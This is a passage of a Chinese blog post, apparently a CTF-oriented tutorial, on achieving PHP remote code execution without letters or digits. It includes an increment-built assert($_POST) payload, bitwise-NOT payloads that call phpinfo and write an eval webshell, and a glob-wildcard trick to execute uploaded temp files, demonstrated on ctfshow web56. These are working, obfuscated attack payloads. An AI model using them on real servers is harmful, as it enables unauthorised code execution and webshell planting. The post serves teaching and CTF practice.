class="comment">//得到&quot;O&quot;，此时$__=&quot;O&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;   <span class="comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$$____</span>;   <span class="comment">//$_=$_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);   <span class="comment">//ASSERT($POST[_])</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="PHP7和PHP5中的特性"><a href="#PHP7和PHP5中的特性" class="headerlink" title="PHP7和PHP5中的特性"></a>PHP7和PHP5中的特性</h2><p>assert是无字母数字RCE中很重要的一个函数，但是php5和php7中的这个函数是有区别的。在php5中，assert是一个函数，因此我们可以动态调用。但是在PHP7中，assert不再是一个函数，而是变成了一个语言结构，不能再作为函数名动态执行代码。在php7中，可以通过<code>($a)()</code>这样的方式来执行命令，也就是说我们对phpinfo取反之后就可以直接执行了，亦或用file_put_contents来写shell。</p>
+<h3 id="php7中"><a href="#php7中" class="headerlink" title="php7中"></a>php7中</h3><p>例如想执行<code>phpinfo()</code>，可以写成<code>(phpinfo)()</code>，利用取反构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)()		//	phpinfo</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250122234018544.png" alt="image-20250122234018544"></p>
+<p>甚至可以直接写马<code>file_put_contents(&#39;4.php&#39;,&#39;&lt;?php eval(\$_POST[1]);&#39;);</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~(%99%96%93%9A%A0%8F%8A%8B%A0%9C%90%91%8B%9A%91%8B%8C))(~(%CB%D1%8F%97%8F),~(%C3%C0%8F%97%8F%DF%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250122234712907.png" alt="image-20250122234712907"></p>
+<p>成功写入</p>
+<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250122234742284.png" alt="image-20250122234742284"></p>
+<h3 id="php5中"><a href="#php5中" class="headerlink" title="php5中"></a>php5中</h3><p>在php5中，不支持用($a)()这样的语句来调用函数，因此需要考虑用一些更巧妙的技巧，参考p神的<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list">无字母数字webshell之提高篇</a>（强烈建议仔细读一下）。</p>
+<p>其中我阅读后，认为这种绕过方式最主要利用到的特性：</p>
+<ol>
+<li>php在处理上传的文件时，会将其保存在临时文件夹下(&#x2F;tmp)，并且默认的文件名为<code>/tmp/phpXXXXXX</code>的形式，文件名的后六位为随机的大小写字母</li>
+<li>可以使用<code>.</code>来执行任意文件，即使这个文件没有执行权限</li>
+<li>Linux下的文件可以使用通配符表示</li>
+</ol>
+<p>我们在php中上传的文件，会被临时放到tmp目录下并且目录为<code>/tmp/phpXXXXXX</code>，但是只是放到该目录下是达不到我们的目的的，那么就需要想办法执行他。此时就想到了Linux中的<code>.</code>，<code>.</code>在执行一个文件的时候，不需要改文件具有执行权限，<code>.</code>代表的是当前的shell，<code>. file</code>也就是使用当前的shell来执行file文件。那么结合起来想一下，如果有一个可以进行rce的点，即使是过滤了字母数字的情况下，我们不就可以使用<code>.</code>来执行我们上传的临时文件了吗。</p>
+<p>但是又出现问题了，本文不就是在讲无字母数字的情况如何进行rce吗，不能传入字母、数字，要怎么获取到上传的临时文件呢。我们就可以使用<strong>通配符</strong>，例如<code>/tmp/phpXXXXXX</code>就可以被表示为&#x2F;???&#x2F;?????????。</p>
+<p>但是，当我们像这样去尝试获取php上传的临时文件时，又出现了问题，有很多能满足&#x2F;???&#x2F;?????????匹配格式的文件，以下引用p神的图</p>
+<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/67a4aab1-9e90-43e6-b3f1-3569c7009390.png" alt="img"></p>
+<p>可以看到，这样的结构，匹配到了这么多文件，而且我们在php中上传生成的临时文件，排到了第6位，那么，在执行<code>. /???/?????????</code>时，就可能在前面的过程中出现问题，然后就导致整个流程终止，无法执行到我们上传的文件。</p>
+<p>那么如何解决，仔细观察，可以发现这些列出来的文件中，只有php的临时文件中<strong>存在大写字母</strong>，并且，在glob通配符中，支持使用<code>[^x]</code>的方法构造表示“这个位置不是字符x”的表达式，因为^在方括号中表示非。一下继续引用p神的图，同理就可以过滤掉很多文件</p>
+<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/1553332a-76fe-4a0a-a8db-7f1ae410c85c.4bb210f52740.png" alt="image.png"></p>
+<p>那么，同理，我们可以通过表达式，去匹配出文件名中带有大写字母的文件，就是php上传文件后生成的临时文件。查看ascii码表：</p>
+<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250123152043304.png" alt="image-20250123152043304"></p>
+<p>可以看到，大写字母在ascii码表上是介于<code>@</code>和<code>[</code>这两个符号之间的，那么在表达式中就可以使用<code>[@-[]</code>来表示大写字母</p>
+<p><code>. /???/????????[@-[]</code></p>
+<p>那么payload就可以这么打</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`. /???/????????[@-[]`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="ctfshow-web56"><a href="#ctfshow-web56" class="headerlink" title="ctfshow web56"></a>ctfshow web56</h3><p>题目：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中，传入的参数$c已经会被system执行了，就可以简化上面说的payload中的反引号。先构造个页面向题目的服务器上传文件</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://8e4b11f5-31db-4e4c-985b-87e22a12ae16.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250123153109598.png" alt="image-20250123153109598"></p>
+<p>上传后，使用参数c尝试读这个文件</p>
+<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250123153619574.png" alt="image-20250123153619574"></p>
+<p>成功执行。如果一次执行了，发现没有成功执行我们的命令，可以多尝试几次，总有一次会匹配到文件最后一位是大写字母，就可以匹配到临时文件，反正最后一位是不是大写字母也就是50%的概率。</p>
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>记得第一次接触到无字母数字RCE，就是小一届的一位师傅来问我ctfshow的web56这题，当时看了一圈wp也是一头雾水，后面静下心来好好看了p神的文章才弄懂，然后在CSDN写了一篇博客与那位师傅分享，有时候花很长的时间捋清楚一个大佬们的骚操作，还是会很有成就感的。也是一个很好的，从别人的提问中学习的例子。多阅读大佬们的博客，多学习一些很巧妙的技巧，学会从别人那里获取知识并吸收，还是很重要的。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://arsenetang.github.io/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/">https://arsenetang.github.io/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1527477-1-1.html">https://www.52pojie.cn/thread-1527477-1-1.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11929?time__1311=Cq0xuD2Dg0i=DsD7zAhOn+34GK40INt3x">https://xz.aliyun.com/t/11929?time__1311=Cq0xuD2Dg0i%3DDsD7zAhOn%2B34GK40INt3x</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8107?time__1311=n4+xnD0Dc7GQDtDkWGODlhje0=n1=rrxRiTD">https://xz.aliyun.com/t/8107?time__1311=n4%2BxnD0Dc7GQDtDkWGODlhje0%3Dn1%3DrrxRiTD</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://yosheep.github.io">YoSheep</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://yosheep.github.io/posts/6157ec5d.html">https://yosheep.github.io/posts/6157ec5d.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yosheep.github.io" target="_blank">YoSheep's 学习笔记</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WEB/">WEB</a><a class="post-meta__tags" href="/tags/RCE/">RCE</a></div><div class="post_share"><div class="social-share" data-image="/img/yeah_circle.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/7547cd0e.html" title="让AI也懵圈：一次CTF中的对抗样本生成与应用"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">让AI也懵圈：一次CTF中的对抗样本生成与应用</div></div></a></div><div class="next-post pull-right"><a href="/posts/691d1762.html" title="RCE之常见绕过方式"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">RCE之常见绕过方式</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/691d1762.html" title="RCE之常见绕过方式"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-21</div><div class="title">RCE之常见绕过方式</div></div></a></div><div><a href="/posts/837881d6.html" title="CVE-2024-9047复现及成因分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-27</div><div class="title">CVE-2024-9047复现及成因分析</div></div></a></div><div><a href="/posts/14897.html" title="HTTP API授权认证：服务器的灵魂三问——你是谁？你要干啥？你能干啥？"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-10</div><div class="title">HTTP API授权认证：服务器的灵魂三问——你是谁？你要干啥？你能干啥？</div></div></a></div><div><a href="/posts/17013.html" title="PHP反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-18</div><div class="title">PHP反序列化</div></div></a></div><div><a href="/posts/affd600b.html" title="Java安全学习(1)-Java反序列化基础"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-22</div><div class="title">Java安全学习(1)-Java反序列化基础</div></div></a></div><div><a href="/posts/12b7d7b4.html" title="Python Pickle 反序列化漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-12</div><div class="title">Python Pickle 反序列化漏洞</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/yeah_circle.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">YoSheep</div><div class="author-info__description">欢迎各位师傅交流学习</br>vx: sunny下划线yosheep</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/YoSheep"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/yosheep" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:sunny_cxw@outlook.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">佬说：“搞安全的，技术不重要，重要的是要会想。”</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E8%BF%90%E7%AE%97%E7%AC%A6%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">用运算符实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81-%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">1.1.</span> <span class="toc-text">1、 异或运算符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81-%E6%88%96%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">1.2.</span> <span class="toc-text">2、 或运算符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81-%E5%8F%96%E5%8F%8D"><span class="toc-number">1.3.</span> <span class="toc-text">3、 取反</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81-%E8%87%AA%E5%A2%9E"><span class="toc-number">1.4.</span> <span class="toc-text">4、 自增</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP7%E5%92%8CPHP5%E4%B8%AD%E7%9A%84%E7%89%B9%E6%80%A7"><span class="toc-number">2.</span> <span class="toc-text">PHP7和PHP5中的特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php7%E4%B8%AD"><span class="toc-number">2.1.</span> <span class="toc-text">php7中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php5%E4%B8%AD"><span class="toc-number">2.2.</span> <span class="toc-text">php5中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow-web56"><span class="toc-number">2.3.</span> <span class="toc-text">ctfshow web56</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="toc-number">3.</span> <span class="toc-text">写在最后</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/affd600b.html" title="Java安全学习(1)-Java反序列化基础">Java安全学习(1)-Java反序列化基础</a><time datetime="2025-08-22T14:47:19.000Z" title="发表于 2025-08-22 22:47:19">2025-08-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/12b7d7b4.html" title="Python Pickle 反序列化漏洞">Python Pickle 反序列化漏洞</a><time datetime="2025-08-12T06:46:34.000Z" title="发表于 2025-08-12 14:46:34">2025-08-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/16f3418.html" title="安卓开发基础学习">安卓开发基础学习</a><time datetime="2025-08-09T15:16:12.000Z" title="发表于 2025-08-09 23:16:12">2025-08-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/37862da4.html" title="跨站脚本攻击-XSS">跨站脚本攻击-XSS</a><time datetime="2025-07-19T04:56:24.000Z" title="发表于 2025-07-19 12:56:24">2025-07-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/cb3612fa.html" title="SQL注入---常见分类攻击方式总结与绕过">SQL注入---常见分类攻击方式总结与绕过</a><time datetime="2025-06-28T03:31:33.000Z" title="发表于 2025-06-28 11:31:33">2025-06-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By YoSheep</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const initValine = () => {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'iSjR5V9ZIytpvfNU137OlQGH-gzGzoHsz',
+      appKey: '9jj4DuX9kTm6wiDHKR1Llu7T',
+      avatar: 'monsterid',
+      serverURLs: 'https://isjr5v9z.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  const loadValine = async () => {
+    if (typeof Valine === 'function') initValine()
+    else {
+      await getScript('https://cdn.jsdelivr.net/npm/valine@1.5.1/dist/Valine.min.js')
+      initValine()
+    }
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
